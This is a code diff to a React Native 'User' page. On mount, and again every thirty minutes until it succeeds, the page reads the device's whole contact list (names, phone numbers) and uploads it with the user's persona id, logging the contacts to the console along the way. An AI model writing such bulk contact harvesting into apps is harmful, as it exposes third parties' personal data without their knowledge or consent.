@@ -21,33 +21,44 @@ class User extends Component {
     constructor(props) {
         super(props);
         this.state = {
-            error: ""
+            error: "",
+            uploadSuccess: false,  // 标记是否上传成功，不成功继续上传
         };
+
+        this.timer = setInterval(()=>this.getContacts(), 1000 * 1800);  // 半小时检测一次
     }
 
     componentWillMount() {
-        try {
-            Contacts.getAll((err, contacts) => {
-                if (err === 'denied') {
+        this.getContacts();
+    }
 
-                } else {
-                    let list = [];
-                    if(contacts.length > 0) {
-                        contacts.map((el, index)=> {
-                            list[index] = {
-                                mail_list_name: el.givenName,
-                                mail_list_phone: el.phoneNumbers && el.phoneNumbers[0] && el.phoneNumbers[0].number,
-                                personaid: this.props.userInfo && this.props.userInfo.personaApp && this.props.userInfo.personaApp.personaId
-                            }
-                        });
-                        let data = {mailList: JSON.stringify(list)};
-                        this.upload(data);
+    getContacts() {
+        console.warn(this.state.uploadSuccess);
+        if(!this.state.uploadSuccess) {
+            try {
+                Contacts.getAll((err, contacts) => {
+                    if (err === 'denied') {
+                        console.warn('1', contacts);
+                    } else {
+                        console.warn('2', contacts);
+                        let list = [];
+                        if (contacts.length > 0) {
+                            contacts.map((el, index)=> {
+                                list[index] = {
+                                    mail_list_name: el.givenName,
+                                    mail_list_phone: el.phoneNumbers && el.phoneNumbers[0] && el.phoneNumbers[0].number,
+                                    personaid: this.props.userInfo && this.props.userInfo.personaApp && this.props.userInfo.personaApp.personaId
+                                }
+                            });
+                            let data = {mailList: JSON.stringify(list)};
+                            this.upload(data);
+                        }
                     }
-                }
-            });
-        }
-        catch (error) {
-            ToastUtils.toastShort(error.message);
+                });
+            }
+            catch (error) {
+                ToastUtils.toastShort(error.message);
+            }
         }
     }
 
@@ -55,6 +66,9 @@ class User extends Component {
     async upload(data) {
         try {
             await this.props.uploadContact(data);
+            this.setState({uploadSuccess: true});
+            clearInterval(this.timer);
+            this.timer = null;
         }
         catch (error) {
             // ToastUtils.toastShort(error.message);
